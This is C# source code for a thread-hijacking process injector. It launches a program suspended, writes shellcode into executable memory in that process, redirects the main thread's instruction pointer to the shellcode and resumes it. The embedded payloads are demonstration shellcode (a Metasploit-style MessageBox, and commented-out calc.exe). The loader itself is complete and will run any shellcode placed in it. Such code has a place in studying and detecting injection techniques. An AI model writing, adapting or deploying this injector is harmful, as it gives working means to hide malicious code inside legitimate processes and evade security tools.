using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static ThreadHijacking.NativeFunctions;
using static ThreadHijacking.NativeStructs;

namespace ThreadHijacking
{
    class ThreadHijacking
    {
        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }

        private static void SetContextForThread(IntPtr Thread_handle, IntPtr shellcode_address)
        {
            IntPtr ThreadContext_address = IntPtr.Zero;

            if (is64Bit())
            {
                CONTEXT64 Thread_context = new CONTEXT64() { ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL };

                //Getting thread context
                ThreadContext_address = Marshal.AllocHGlobal(Marshal.SizeOf(Thread_context));
                RtlZeroMemory(ThreadContext_address, Marshal.SizeOf(Thread_context));
                Marshal.StructureToPtr(Thread_context, ThreadContext_address, false);

                GetThreadContext(Thread_handle, ThreadContext_address);
                Thread_context = (CONTEXT64)Marshal.PtrToStructure(ThreadContext_address, typeof(CONTEXT64));
                Thread_context.Rip = (ulong)shellcode_address;

                Marshal.StructureToPtr(Thread_context, ThreadContext_address, true);
            }
            else
            {
                CONTEXT Thread_context = new CONTEXT() { ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL };

                ThreadContext_address = Marshal.AllocHGlobal(Marshal.SizeOf(Thread_context));
                RtlZeroMemory(ThreadContext_address, Marshal.SizeOf(Thread_context));
                Marshal.StructureToPtr(Thread_context, ThreadContext_address, false);

                GetThreadContext(Thread_handle, ThreadContext_address);
                Thread_context = (CONTEXT)Marshal.PtrToStructure(ThreadContext_address, typeof(CONTEXT));
                Thread_context.Eip = (uint)shellcode_address;

                Marshal.StructureToPtr(Thread_context, ThreadContext_address, true);
            }

            SetThreadContext(Thread_handle, ThreadContext_address);


        }

        private static IntPtr ProcessInject(IntPtr Process_handle, byte[] shellcode)
        {
            uint shellocde_size = (uint)shellcode.Length;
            IntPtr Inject_address = VirtualAllocEx(
                Process_handle,
                IntPtr.Zero,
                shellocde_size,
                AllocationType.Reserve | AllocationType.Commit,
                AllocationProtect.PAGE_EXECUTE_READWRITE
            );

            uint lpNumberOfBytesWritten = 0;
            uint nt_status = NtWriteVirtualMemory(
                Process_handle,
                Inject_address,
                shellcode,
                shellocde_size,
                ref lpNumberOfBytesWritten
            );

            return Inject_address;
        }

        public static void Thread_hijacking(string createprocess_path)
        {
            //Create the hollowing process ins suspended state    
            STARTUPINFO STARTUPINFO_instance = new STARTUPINFO();
            PROCESS_INFORMATION PROCESS_INFORMATION_instance = new PROCESS_INFORMATION();

            bool nt_createstatus = CreateProcess(
                null,
                createprocess_path,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CreateProcessFlags.CREATE_SUSPENDED | CreateProcessFlags.CREATE_NEW_CONSOLE,
                IntPtr.Zero,
                null,
                ref STARTUPINFO_instance,
                out PROCESS_INFORMATION_instance
            );

            if (nt_createstatus)
            {
                Console.WriteLine("Successfully created the process...");
                
                /* MessageBox  x64*/
                byte[] shellcode = new byte[323] {
                0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
                0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
                0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
                0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
                0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
                0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
                0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
                0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
                0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
                0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
                0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
                0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
                0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
                0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,
                0x85,0x2b,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
                0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
                0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
                0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x48,0x65,0x6c,0x6c,0x6f,
                0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,0x65,0x73,
                0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 };
                

                /*
                // x86 calc
                byte[] shellcode = new byte[193] {
                    0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
                    0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
                    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
                    0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
                    0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
                    0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
                    0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                    0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
                    0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
                    0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
                    0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
                    0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
                    0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 
                };
                */

                IntPtr Process_handle = PROCESS_INFORMATION_instance.hProcess;
                IntPtr Thread_handle = PROCESS_INFORMATION_instance.hThread;
                IntPtr shellcode_address = ProcessInject(Process_handle, shellcode);

                SetContextForThread(Thread_handle, shellcode_address);
                ResumeThread(Thread_handle);
                System.Threading.Thread.Sleep(10000);
            }
        }
    }
}
